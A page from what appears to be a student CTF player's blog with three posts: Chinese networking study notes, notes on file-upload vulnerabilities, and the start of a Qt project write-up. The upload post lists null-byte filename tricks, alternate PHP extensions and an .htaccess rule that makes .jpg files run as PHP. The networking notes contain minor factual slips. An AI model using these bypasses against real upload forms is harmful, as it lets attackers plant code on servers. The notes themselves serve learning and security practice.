<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="CTFer,CUMT"/><meta name="keywords" content="CTF" /><link rel="alternate" href="/atom.xml" title="M1key"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://m1key.xyz/page/7/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
  </script>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_analytics">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?ac3e804c7e07addaaf3f80f2371f03e2";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
  <script id="leancloud">
    AV.init({
      appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
      appKey: "FL93w3BBbF9lxiR8X1HI58En"
    });
  </script><script>
  window.config = {"leancloud":{"app_id":"KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz","app_key":"FL93w3BBbF9lxiR8X1HI58En"},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>M1key</title>
  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="M1key" type="application/atom+xml">
</head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">M1key</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">M1key</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><section id="posts" class="posts"><article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/12/09/%E8%AE%A1%E7%BD%91/">计网</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-09
        </span><span class="post-category">
            <a href="/categories/%E8%AE%A1%E7%BD%91/">计网</a>
            </span>
        <span class="post-visits"
             data-url="/2020/12/09/%E8%AE%A1%E7%BD%91/"
             data-title="计网">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><p>这个只有这一部分了</p>
<p>后面学了但好像丢了</p>
<p>看多会学到计网时，再来补这一篇</p>
<h1 id="计网初学"><a href="#计网初学" class="headerlink" title="计网初学"></a>计网初学</h1><h2 id="TCP-IP分层模型"><a href="#TCP-IP分层模型" class="headerlink" title="TCP/IP分层模型"></a><strong>TCP/IP分层模型</strong></h2><div class="table-container">
<table>
<thead>
<tr>
<th>应用层（第五层)</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>传输层（第四层）</strong></td>
</tr>
<tr>
<td><strong>互联网层（第三层）</strong></td>
</tr>
<tr>
<td><strong>网路接口层（第二层）</strong></td>
</tr>
<tr>
<td><strong>物理层（第一层）</strong></td>
</tr>
</tbody>
</table>
</div>
<p>物理层：对应于网络的基本硬件，即我们可以看得见的硬件设备。</p>
<p>网络接口层：定义了将数据组成正确帧的规程和在网络中传输帧的规程。</p>
<p>互联网层：本层定义了互联网中传输的信息包的格式，以及从一个用户通过一个或多个路由器到最终目标的信息包转发机制。</p>
<p>传输层：为两个用户进程之间建立，管理和拆除可靠而又有效的端到端的连接。</p>
<p>应用层：定义了应用程序使用互联网的规程。</p>
<h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p>ip地址分为两部分：网络标识和主机标识</p>
<p>网络标识：用以标明具体的网络段</p>
<p>主机标识：某个网络中待定的计算机号码</p>
<p>网络标识：210.73.140.0</p>
<p>主机标识：                    2</p>
<p>合起来写：210.73.140.2</p>
<p>人们按照网络规模的大小，把32为地址信息设成3种定位的划分方式，三种划分方法分别对应于A，B，C类IP地址，IP地址分为网络号和主机号两部分</p>
<p>（1）A类IP地址（1-126）</p>
<p>该地址由1字节网络地址和3字节主机地址组成，网络地址最高位必须是0。</p>
<p>（2）B类IP地址（128-191）</p>
<p>该地址由2字节网络地址和2字节主机地址组成，网络地址最高位必须是10。</p>
<p>（3）C类IP地址（192-223）</p>
<p>该地址由3字节网络地址和1字节主机地址组成，网络地址最高位必须是110。</p>
<p>（4）D类IP地址（224-239）</p>
<p>多点广播地址，用于IP组播。</p>
<p>（5）E类IP地址（240-225）</p>
<p>保留地址，用作特殊用途。</p>
<p>（0.0.0.0）对应当前主机，（255.255.255.255）是当前子网的传播地址。</p>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>顶级域名 .com</p>
<p>二级域名 test.com</p>
<p>三级域名 test.cn.com</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609213455144.png" alt="image-20200609213455144"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214339970.png" alt="image-20200609214339970"></p>
<h2 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h2><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609214938548.png" alt="image-20200609214938548"></p>
<h1 id="计网学习"><a href="#计网学习" class="headerlink" title="计网学习"></a>计网学习</h1><h2 id="第一章-计算机网络概述"><a href="#第一章-计算机网络概述" class="headerlink" title="第一章 计算机网络概述"></a>第一章 计算机网络概述</h2><p>局域网：覆盖范围小  自己花钱买设备  带宽固定</p>
<p>广域网：距离远 花钱买服务</p>
<p>Internet ：有自己的机房  对网民提供连接。</p>
<p>IP地址：网络中的地址。</p>
<p>物理地址：Mac地址，电脑出厂时已固定。</p>
<p>网关：下图中的G就是网关，相当于网络中的一个关卡。网关地址为G的IP地址。</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200609224145835.png" alt="image-20200609224145835"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>本机ip</th>
<th>访问ip</th>
<th>本机mac</th>
<th>下次访问mac</th>
</tr>
</thead>
<tbody>
<tr>
<td>15.0.0.2</td>
<td>13.0.0.2</td>
<td>m4</td>
<td>m5</td>
</tr>
</tbody>
</table>
</div>
<p><strong>OSI参考模型</strong></p>
<ul>
<li>应用层：能产生网络流量的程序</li>
<li>表示层：在传输之前是否加密或压缩处理</li>
<li>会话层：查正在进行会话的程序 netstat -nb</li>
<li>传输层：可靠传输（TCP）和流量控制 不可靠传输（UDP）</li>
<li>网络层：选择最佳路径 规划IP地址</li>
<li>数据链路层：帧的开始和结束。差错检查。</li>
<li>物理层：接口标准和电器标准</li>
</ul>
<p><strong>OSI参考模型网络排错指导</strong></p>
<ol>
<li>物理层故障：查看连接状态，发送和接受的数据包</li>
<li>数据链路层：MAC地址冲突、网速协商不一致、计算机VLAN错误</li>
<li>网络层故障：配置错误的IP地址 子网掩码和错误的网关</li>
<li>应用层故障：应用错误代理。</li>
</ol>
<p>检查网络是否通畅：ping一个网址</p>
<p><strong>OSI参考模型和网络安全</strong></p>
<ol>
<li>物理层安全</li>
<li>数据链路层安全：登录需要账号和密码</li>
<li>网络层安全：路由器限制数据包流量</li>
<li>应用层安全：开发程序有没有漏洞<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122326325.png" alt="image-20200610122326325"></li>
</ol>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200610122957433.png" alt="image-20200610122957433"></p>
<h2 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章 物理层"></a>第二章 物理层</h2><h3 id="0x01物理层的基本概念"><a href="#0x01物理层的基本概念" class="headerlink" title="0x01物理层的基本概念"></a>0x01物理层的基本概念</h3><p>物理层解决如何连接在各种计算机的<strong>传输媒体上</strong>传输<strong>数据比特流</strong>，不是指具体的传输媒体。</p>
<p>物理层主要是确定传输媒体的接口的一些特性。有机械，电器，功能，过程特性。</p>
<h3 id="0x02数据通信知识"><a href="#0x02数据通信知识" class="headerlink" title="0x02数据通信知识"></a>0x02数据通信知识</h3><p><strong>数据通信模型</strong>：</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611101252348.png" alt="image-20200611101252348"></p>
<p>数据：运送消息的实体。</p>
<p>信号：数据电气或电磁的表现。</p>
<p>信道：表示一个方向传送信息的媒体。</p>
<p>单向通信，双向交替通信，双向同时通信。</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611103259080.png" alt="image-20200611103259080"></p>
<h3 id="0x03物理层下面的传输媒体"><a href="#0x03物理层下面的传输媒体" class="headerlink" title="0x03物理层下面的传输媒体"></a>0x03物理层下面的传输媒体</h3><p>无屏蔽双绞线UTP</p>
<p>屏蔽双绞线STP</p>
<p>同轴电缆</p>
<p>光纤</p>
<p>微波传输</p>
<p>物理层设备—集线器</p>
<h3 id="0x04信道复用技术"><a href="#0x04信道复用技术" class="headerlink" title="0x04信道复用技术"></a>0x04信道复用技术</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611121924344.png" alt="image-20200611121924344"></p>
<h3 id="0x05数字传输系统"><a href="#0x05数字传输系统" class="headerlink" title="0x05数字传输系统"></a>0x05数字传输系统</h3><h3 id="0x06宽带接入技术"><a href="#0x06宽带接入技术" class="headerlink" title="0x06宽带接入技术"></a>0x06宽带接入技术</h3><p>ADSL</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611122852820.png" alt="image-20200611122852820"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123214486.png" alt="image-20200611123214486"></p>
<p>光纤</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123435591.png" alt="image-20200611123435591"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200611123546821.png" alt="image-20200611123546821"></p>
<h2 id="第三章数据链路层"><a href="#第三章数据链路层" class="headerlink" title="第三章数据链路层"></a>第三章数据链路层</h2><h3 id="0x01数据链路层基本概念"><a href="#0x01数据链路层基本概念" class="headerlink" title="0x01数据链路层基本概念"></a>0x01数据链路层基本概念</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615185534103.png" alt="image-20200615185534103"></p>
<p>数据链路层信道类型：点到点和广播。</p>
<p>链路：是一条点到点的物理线路段。</p>
<p>数据链路：除了物理线路外，还必须有通信协议来控制这些数据的传输。</p>
<p>帧：帧头 帧尾 mac地址 校验码</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615190949900.png" alt="image-20200615190949900"></p>
<h3 id="0x02数据链路层的三个基本问题"><a href="#0x02数据链路层的三个基本问题" class="headerlink" title="0x02数据链路层的三个基本问题"></a>0x02数据链路层的三个基本问题</h3><p>1.封装成帧</p>
<p>2.透明传输（将转义字符转义）</p>
<p>3.差错控制</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p>
<p>传的数据为<strong>101001001</strong>/1101余数为0就会接受。</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p>
<h3 id="0x03两种情况下的数据链路层"><a href="#0x03两种情况下的数据链路层" class="headerlink" title="0x03两种情况下的数据链路层"></a>0x03两种情况下的数据链路层</h3><p><strong>点到点信道的数据链路层</strong>（广域网）</p>
<p>PPP协议</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p>
<p><strong>广播信道的数据链路层</strong>（集线器）</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p>
<h3 id="0x04以太网"><a href="#0x04以太网" class="headerlink" title="0x04以太网"></a>0x04以太网</h3><p>以太网是一种CSMA/CD的局域网</p>
<p><strong>媒体接入控制层</strong>（MAC ）</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p>
<p>FCS抓包之后会删掉。</p>
<h3 id="0x05扩展以太网"><a href="#0x05扩展以太网" class="headerlink" title="0x05扩展以太网"></a>0x05扩展以太网</h3><p>集线器级联，会使网络中计算机数量增加，但会使冲突域增大，如何优化呢？</p>
<p><strong>网桥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p>
<p>网桥就是交换机的前身，交换机相当于网桥和集线器。</p>
<h3 id="0x06高速以太网"><a href="#0x06高速以太网" class="headerlink" title="0x06高速以太网"></a>0x06高速以太网</h3><h2 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h2><h3 id="0x01网络层提供的服务"><a href="#0x01网络层提供的服务" class="headerlink" title="0x01网络层提供的服务"></a>0x01网络层提供的服务</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p>
<p>（路由器是网络层设备）</p>
<p>网络地址相同就可以看成一个<strong>网段</strong>，怎么看网络地址呢？可以看子网掩码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">子网掩码:255.0.0.0</span><br><span class="line">&#x2F;&#x2F;此时，我们可以看出子网掩码是255，那表明ip地址中10就是网络地址。</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">子网掩码255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0说明在这个网段中12.0是网络地址</span><br><span class="line"></span><br><span class="line">网关：路由器上配置，一般为该网段中的第一个地址，实际上任意一个地址都可以。</span><br><span class="line"></span><br><span class="line">路由器：路由器是无法知道它具体网段的位置，需要添加路由表。</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p>
<h3 id="0x02网络设备和OSI参考模型"><a href="#0x02网络设备和OSI参考模型" class="headerlink" title="0x02网络设备和OSI参考模型"></a>0x02网络设备和OSI参考模型</h3><p>发送端：</p>
<ol>
<li><p>应用层 程序准备要传输的文件</p>
</li>
<li><p>传输层 将文件编号</p>
</li>
<li><p>网络层 添加IP地址</p>
</li>
<li><p>数据链路层  有两种情况 </p>
<p>第一种 通过子网掩码 ，判断是否是同一个网段。如果是，利用ARP协议广播解析目标ip地址的MAC地址</p>
<p>第二种</p>
</li>
</ol>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p>
<h3 id="0x03网络层协议"><a href="#0x03网络层协议" class="headerlink" title="0x03网络层协议"></a>0x03网络层协议</h3><h4 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a><strong>ARP协议</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;查询mac地址</span><br><span class="line">arp -s ip地址 mac地址   &#x2F;&#x2F;配置IP地址的MAC地址</span><br></pre></td></tr></table></figure>
<p>arp协议:将ip地址通过广播 目标MAC地址是FF-FF-FF-FF-FF-FF<strong>解析目标ip地址的MAC地址</strong></p>
<p>arp欺骗: 数据链路层故障，缓存了错误的MAC地址</p>
<h4 id="网际控制报文协议（ICMP）"><a href="#网际控制报文协议（ICMP）" class="headerlink" title="网际控制报文协议（ICMP）"></a><strong>网际控制报文协议</strong>（ICMP）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">							128 windows</span><br><span class="line">							255 unix</span><br><span class="line">ping www.baidu.com -t    一直ping</span><br><span class="line">ping www.baidu.com -l 200   定义数据包的大小</span><br><span class="line">&#x2F;&#x2F;查看路由器的地址</span><br><span class="line">ping 8.8.8.8 -i 1 更改数据包ttl时间，可以跟踪途经的路由器</span><br><span class="line">pathping   跟踪ping的路径</span><br><span class="line">tracert    直接跟踪路由</span><br></pre></td></tr></table></figure>
<h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>配置在路由器上扫描多播地址的协议</p>
<p>广播：目标ip地址是全ff，目标mac地址是255，向局域网内所有计算机发出广播</p>
<p>点到点：从一个点到另一个点</p>
<p>组播：一对多</p>
<h3 id="0x04数据包"><a href="#0x04数据包" class="headerlink" title="0x04数据包"></a>0x04数据包</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p>
<p>版本：用来表示TCP/IP协议的版本 v4 v6</p>
<p>区分服务：看谁的优先级高</p>
<p>标识：100 100 100就为一个数据包</p>
<p>标志：看数据包是否分片<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p>
<p>生存时间（TTL）：每过一个路由器，生存时间会修改。</p>
<p>协议号：交给哪个协议进行处理</p>
<p>（ICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89）</p>
<p>数据链路层支持数据包1500字节</p>
<p>IP层支持数据包是65535字节，所以需要分片传输，但一般不会超过1500字节。</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p>
<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p>
<p><strong>Active Mode</strong></p>
<p>第二信道是服务器主动发起的。</p>
<p>第一信道是21端口</p>
<p>第二信道是20端口</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p>
<p><strong>Passive</strong></p>
<p>第一信道是21端口</p>
<p>第二信道是随机端口</p>
<p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p>
<h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p>
<p><strong>telnet</strong>的端口是23端口</p>
<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-09
        </span><span class="post-category">
            <a href="/categories/web/">web</a>
            </span>
        <span class="post-visits"
             data-url="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
             data-title="文件上传">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p>
<h2 id="0x01基本流程"><a href="#0x01基本流程" class="headerlink" title="0x01基本流程"></a>0x01基本流程</h2><ol>
<li>图片是否正常上传。</li>
<li>图片上传内容是否被感染。（内容替换 抓包改）</li>
<li>上传的域名是否是目标服务器。</li>
<li>上传的目录是否支持解析</li>
</ol>
<h2 id="0x02绕过js"><a href="#0x02绕过js" class="headerlink" title="0x02绕过js"></a>0x02绕过js</h2><h2 id="0x03文件上传空字节"><a href="#0x03文件上传空字节" class="headerlink" title="0x03文件上传空字节"></a>0x03文件上传空字节</h2><p>抓包的时候 %00</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure>
<h2 id="0x04文件上传名单验证"><a href="#0x04文件上传名单验证" class="headerlink" title="0x04文件上传名单验证"></a>0x04文件上传名单验证</h2><p>黑名单：不允许什么上传</p>
<p>白名单：允许什么上传</p>
<p>可以尝试php3 php4 php5 phtml，pht使用  或服务器解析漏洞</p>
<h2 id="0x05二次上传"><a href="#0x05二次上传" class="headerlink" title="0x05二次上传"></a>0x05二次上传</h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-type中表示了文件类型。</p>
<h2 id="0x07解析漏洞"><a href="#0x07解析漏洞" class="headerlink" title="0x07解析漏洞"></a>0x07解析漏洞</h2><h3 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p>
<h3 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p>
<h3 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p>
<h3 id="net上传"><a href="#net上传" class="headerlink" title=".net上传"></a>.net上传</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p>
<h3 id="phtml上传"><a href="#phtml上传" class="headerlink" title="phtml上传"></a>phtml上传</h3><p>在apache配置文件中添加（httpd.conf）中添加</p>
<p>AddType application/x-httpd-php.phtml</p>
<p>这样phtml后缀的文件就会按照php去解析</p>
<h3 id="htaccess上传"><a href="#htaccess上传" class="headerlink" title=".htaccess上传"></a>.htaccess上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;会将所有的jpg文件都按照php来解析</span><br></pre></td></tr></table></figure>
<h2 id="0x08双文件上传"><a href="#0x08双文件上传" class="headerlink" title="0x08双文件上传"></a>0x08双文件上传</h2>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/">大二程序设计综合实践</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-12-07
        </span><span class="post-category">
            <a href="/categories/Qt/">Qt</a>
            </span>
        <span class="post-visits"
             data-url="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/"
             data-title="大二程序设计综合实践">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="程序设计综合实践"><a href="#程序设计综合实践" class="headerlink" title="程序设计综合实践"></a>程序设计综合实践</h1><p>图形化编程</p>
<p>这不同语言分数还不太一样，最后用Qt了</p>
<p>四个星期四个实验，应该问题不大</p>
<p>趁下次比赛之前把这个实验弄完</p>
<p>先贴链接</p>
<p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p>
<p>下面尽量用代码和注释介绍基础知识，写得有点乱，可以看b站去学</p>
<p>主要是自己记录一下知识</p>
<p>我用的是5.14的 b站应该是5.5的 有些知识会有点出入</p>
<h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-创建qt项目"><a href="#0x01-创建qt项目" class="headerlink" title="0x01 创建qt项目"></a>0x01 创建qt项目</h2><p>安装完成后</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p>
<p>可以先看一下上面这个内容</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 模块"></p>
<h3 id="1-新建项目"><a href="#1-新建项目" class="headerlink" title="1.新建项目"></a>1.新建项目</h3><p>选第一个</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p>
<p>一直默认，直到选类名<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p>
<p>之后一直默认就可以了</p>
<p>最终界面如图</p>
